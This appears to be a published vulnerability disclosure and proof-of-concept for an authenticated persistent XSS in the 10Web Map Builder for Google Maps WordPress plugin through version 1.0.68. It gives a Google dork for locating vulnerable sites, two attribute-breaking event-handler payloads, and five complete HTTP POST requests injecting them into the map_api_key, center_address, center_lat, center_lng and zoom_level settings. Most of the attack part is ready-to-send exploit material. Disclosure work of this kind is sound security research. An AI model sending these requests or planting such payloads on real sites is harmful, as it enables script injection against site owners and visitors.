/*!
- # VULNERABILITY: 10Web Map Builder for Google Maps Plugin <= 1.0.68 - Authenticated Persistent XSS
- # GOOGLE DORK: inurl:/wp-content/plugins/wd-google-maps/
- # DATE: 2021-06-12
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: 10Web [ https://10web.io ]
- # SOFTWARE VERSION: <= 1.0.68
- # SOFTWARE LINK: https://wordpress.org/plugins/wd-google-maps/
- # CVSS: 3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the 10Web Map Builder for Google Maps plugin through v1.0.68 for WordPress.

[i] Vulnerable parameter(s): &map_api_key, &center_address, &center_lat, &center_lng, &zoom_level.



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] " style=animation-name:rotation onanimationstart=alert(origin); //

[$] " style=animation-name:rotation onanimationstart=alert(1553); //



### -- [ PoC #1 | Authenticated Persistent XSS | Options > &map_api_key: ]

[!] POST /wp-admin/admin.php?page=options_gmwd&message_id=10 HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 643

nonce_gmwd=3443cdef1e&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Doptions_gmwd%26message_id%3D10&map_api_key=13%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%281553%29%3B+%2F%2F&map_language=ar&marker_default_icon=&center_address=Moscow&center_lat=1337&center_lng=1337&zoom_level=13&whell_scrolling=0&map_draggable=0&gdpr=0&gdpr_text=+PoC&page=options_gmwd&task=apply



### -- [ PoC #2 | Authenticated Persistent XSS | Options > &center_address: ]

[!] POST /wp-admin/admin.php?page=options_gmwd&message_id=10 HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 643

nonce_gmwd=3443cdef1e&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Doptions_gmwd%26message_id%3D10&map_api_key=13&map_language=ar&marker_default_icon=&center_address=Moscow%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28origin%29%3B+%2F%2F&center_lat=1337&center_lng=1337&zoom_level=13&whell_scrolling=0&map_draggable=0&gdpr=0&gdpr_text=+PoC&page=options_gmwd&task=apply



### -- [ PoC #3 | Authenticated Persistent XSS | Options > &center_lat: ]

[!] POST /wp-admin/admin.php?page=options_gmwd&message_id=10 HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 643

nonce_gmwd=3443cdef1e&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Doptions_gmwd%26message_id%3D10&map_api_key=13&map_language=ar&marker_default_icon=&center_address=Moscow&center_lat=1337%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28origin%29%3B+%2F%2F&center_lng=1337&zoom_level=13&whell_scrolling=0&map_draggable=0&gdpr=0&gdpr_text=+PoC&page=options_gmwd&task=apply



### -- [ PoC #4 | Authenticated Persistent XSS | Options > &center_lng: ]

[!] POST /wp-admin/admin.php?page=options_gmwd&message_id=10 HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 643

nonce_gmwd=3443cdef1e&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Doptions_gmwd%26message_id%3D10&map_api_key=13&map_language=ar&marker_default_icon=&center_address=Moscow&center_lat=1337&center_lng=1337%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28origin%29%3B+%2F%2F&zoom_level=13&whell_scrolling=0&map_draggable=0&gdpr=0&gdpr_text=+PoC&page=options_gmwd&task=apply



### -- [ PoC #5 | Authenticated Persistent XSS | Options > &zoom_level: ]

[!] POST /wp-admin/admin.php?page=options_gmwd&message_id=10 HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 643

nonce_gmwd=3443cdef1e&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Doptions_gmwd%26message_id%3D10&map_api_key=1337&map_language=ar&marker_default_icon=&center_address=Moscow&center_lat=1337&center_lng=1337&zoom_level=13%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%281553%29%3B+%2F%2F&whell_scrolling=0&map_draggable=0&gdpr=0&gdpr_text=+PoC&page=options_gmwd&task=apply



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
